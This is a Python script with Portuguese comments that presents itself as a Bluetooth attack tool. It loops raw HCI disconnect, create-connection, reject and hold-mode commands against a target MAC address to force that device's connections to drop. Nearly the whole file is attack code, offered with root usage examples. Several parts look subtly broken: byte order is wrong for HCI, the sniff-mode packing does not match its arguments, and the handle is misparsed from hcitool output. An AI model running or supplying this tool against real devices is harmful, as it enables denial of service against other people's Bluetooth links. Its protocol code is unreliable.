#!/usr/bin/env python3
"""
Reconexão Forçada via HCI - Controle Real de Link-Layer
Usa comandos HCI diretos para forçar reconexão e derrubar conexões existentes
REQUER: Adaptador Bluetooth controlável + Root
"""

import struct
import socket
import sys
import time
import argparse
import os

# HCI Socket constants
HCI_CHANNEL_USER = 1
HCI_CHANNEL_CONTROL = 3

# HCI Command OGF/OCF
OGF_LINK_CTL = 0x01
OCF_DISCONNECT = 0x0006
OCF_CREATE_CONN = 0x0005
OCF_ACCEPT_CONN = 0x0009
OCF_REJECT_CONN = 0x000A
OCF_LINK_KEY_REQ_REPLY = 0x000B
OCF_LINK_KEY_NEG_REPLY = 0x000C

OGF_LINK_POLICY = 0x02
OCF_HOLD_MODE = 0x0001
OCF_SNIFF_MODE = 0x0003
OCF_EXIT_SNIFF_MODE = 0x0004

OGF_HOST_CTL = 0x03
OCF_RESET = 0x0003
OCF_SET_EVENT_FILTER = 0x0005
OCF_WRITE_SCAN_ENABLE = 0x001A
OCF_WRITE_AUTH_ENABLE = 0x0020

# HCI Event codes
EVT_DISCONN_COMPLETE = 0x05
EVT_CONN_COMPLETE = 0x03
EVT_AUTH_COMPLETE = 0x06

def check_root():
    """Verifica privilégios root"""
    return os.geteuid() == 0

def mac_to_bytes(mac_str):
    """Converte MAC string para bytes"""
    return bytes.fromhex(mac_str.replace(':', '').replace('-', ''))

def bytes_to_mac(mac_bytes):
    """Converte bytes para MAC string"""
    return ':'.join(f'{b:02X}' for b in mac_bytes)

def create_hci_socket(device_id=0):
    """
    Cria socket HCI raw para controle direto do adaptador
    """
    try:
        # Socket HCI raw (requer root)
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        sock.bind((device_id,))
        return sock
    except PermissionError:
        raise PermissionError("Requer privilégios root para acesso HCI raw")
    except Exception as e:
        raise Exception(f"Erro ao criar socket HCI: {e}")

def send_hci_command(sock, ogf, ocf, params=b''):
    """
    Envia comando HCI e retorna resposta
    """
    # Formato: [type(1)] [opcode(2)] [length(1)] [params]
    opcode = (ogf << 10) | ocf
    pkt_type = 0x01  # HCI Command
    length = len(params)
    
    packet = struct.pack('>BHB', pkt_type, opcode, length) + params
    sock.send(packet)
    
    # Ler resposta
    try:
        response = sock.recv(1024)
        return response
    except socket.timeout:
        return None

def hci_disconnect(sock, handle, reason=0x13):
    """
    Desconecta conexão ACL via HCI
    reason: 0x13 = Remote User Terminated Connection
    """
    params = struct.pack('>HB', handle, reason)
    return send_hci_command(sock, OGF_LINK_CTL, OCF_DISCONNECT, params)

def hci_create_connection(sock, target_mac, pkt_type=0xcc18, pscan_rep_mode=0x02):
    """
    Força criação de conexão ACL
    """
    mac_bytes = mac_to_bytes(target_mac)
    params = struct.pack('>6sHBBBB', mac_bytes, pkt_type, pscan_rep_mode, 0x00, 0x00, 0x00)
    return send_hci_command(sock, OGF_LINK_CTL, OCF_CREATE_CONN, params)

def hci_reject_connection(sock, target_mac, reason=0x0F):
    """
    Rejeita conexão (pode causar desconexão em alguns firmwares)
    """
    mac_bytes = mac_to_bytes(target_mac)
    params = struct.pack('>6sB', mac_bytes, reason)
    return send_hci_command(sock, OGF_LINK_CTL, OCF_REJECT_CONN, params)

def hci_hold_mode(sock, handle, max_interval=0x0001, min_interval=0x0001):
    """
    Força modo HOLD - pausa conexão
    """
    params = struct.pack('>HHH', handle, max_interval, min_interval)
    return send_hci_command(sock, OGF_LINK_POLICY, OCF_HOLD_MODE, params)

def hci_sniff_mode(sock, handle, max_interval=0x0001, min_interval=0x0001):
    """
    Força modo SNIFF - reduz largura de banda
    """
    params = struct.pack('>HHHH', handle, max_interval, min_interval, 0x00, 0x00)
    return send_hci_command(sock, OGF_LINK_POLICY, OCF_SNIFF_MODE, params)

def parse_hci_events(sock, timeout=2):
    """
    Lê e parseia eventos HCI
    """
    sock.settimeout(timeout)
    events = []
    
    try:
        while True:
            data = sock.recv(1024)
            if len(data) < 3:
                continue
            
            evt_type = data[0]
            evt_code = data[1]
            evt_len = data[2]
            
            if evt_type == 0x04:  # HCI Event
                events.append({
                    'code': evt_code,
                    'data': data[3:3+evt_len] if len(data) >= 3+evt_len else b''
                })
    except socket.timeout:
        pass
    
    return events

def get_active_connections(sock):
    """
    Obtém conexões ACL ativas (via eventos ou hcitool)
    """
    # Alternativa: usar hcitool con
    import subprocess
    try:
        result = subprocess.run(['hcitool', 'con'], 
                              capture_output=True, text=True, timeout=2)
        connections = []
        for line in result.stdout.split('\n')[1:]:  # Pular header
            if 'ACL' in line:
                parts = line.split()
                if len(parts) >= 3:
                    mac = parts[2]
                    handle = parts[1] if len(parts) > 1 else None
                    connections.append({'mac': mac, 'handle': handle})
        return connections
    except:
        return []

def forced_reconnect_attack(target_mac, duration=30, interface=0):
    """
    Ataque principal: força reconexão repetida para derrubar conexão existente
    """
    print(f"[*] Iniciando ataque de reconexão forçada HCI")
    print(f"[*] Alvo: {target_mac}")
    print(f"[*] Interface: hci{interface}")
    print(f"[*] Duração: {duration} segundos\n")
    
    try:
        sock = create_hci_socket(interface)
        sock.settimeout(0.5)
        print("[+] Socket HCI criado com sucesso\n")
    except Exception as e:
        print(f"[!] Erro ao criar socket HCI: {e}")
        return
    
    start_time = time.time()
    attempt = 0
    
    try:
        while time.time() - start_time < duration:
            attempt += 1
            
            # Método 1: Tentar desconectar conexões ativas
            connections = get_active_connections(sock)
            for conn in connections:
                if target_mac.lower() in conn['mac'].lower():
                    if conn.get('handle'):
                        try:
                            handle = int(conn['handle'], 16)
                            hci_disconnect(sock, handle)
                            print(f"[+] Desconexão HCI enviada (handle: {hex(handle)})")
                        except:
                            pass
            
            # Método 2: Forçar criação de nova conexão (conflito)
            hci_create_connection(sock, target_mac)
            
            # Método 3: Rejeitar conexão (alguns firmwares desconectam)
            hci_reject_connection(sock, target_mac)
            
            # Método 4: Modo HOLD (pausa conexão)
            if attempt % 5 == 0:
                # Tentar obter handle e forçar HOLD
                connections = get_active_connections(sock)
                for conn in connections:
                    if target_mac.lower() in conn['mac'].lower() and conn.get('handle'):
                        try:
                            handle = int(conn['handle'], 16)
                            hci_hold_mode(sock, handle)
                        except:
                            pass
            
            if attempt % 10 == 0:
                print(f"[*] {attempt} tentativas...")
            
            time.sleep(0.2)
            
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido")
    except Exception as e:
        print(f"[!] Erro: {e}")
    finally:
        sock.close()
        print(f"\n[+] Ataque concluído: {attempt} tentativas")

def main():
    parser = argparse.ArgumentParser(
        description='Reconexão Forçada via HCI - Controle Real de Link-Layer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
REQUER: Root + Adaptador Bluetooth compatível

Exemplos:
  sudo python3 hci_forced_reconnect.py --target AA:BB:CC:DD:EE:FF
  sudo python3 hci_forced_reconnect.py --target AA:BB:CC:DD:EE:FF --duration 60 --interface 0
        """
    )
    
    parser.add_argument('--target', '-t', required=True, help='MAC do alvo')
    parser.add_argument('--duration', '-d', type=int, default=30, help='Duração (segundos)')
    parser.add_argument('--interface', '-i', type=int, default=0, help='Interface HCI (padrão: 0)')
    
    args = parser.parse_args()
    
    if not check_root():
        print("[!] ERRO: Requer privilégios root!")
        print("[!] Execute: sudo python3 hci_forced_reconnect.py ...")
        sys.exit(1)
    
    mac = args.target.upper().replace('-', ':')
    if len(mac) != 17 or mac.count(':') != 5:
        print("[!] MAC inválido")
        sys.exit(1)
    
    print("=" * 60)
    print("    RECONEXÃO FORÇADA VIA HCI")
    print("=" * 60)
    print()
    
    try:
        forced_reconnect_attack(mac, args.duration, args.interface)
    except Exception as e:
        print(f"[!] Erro fatal: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()

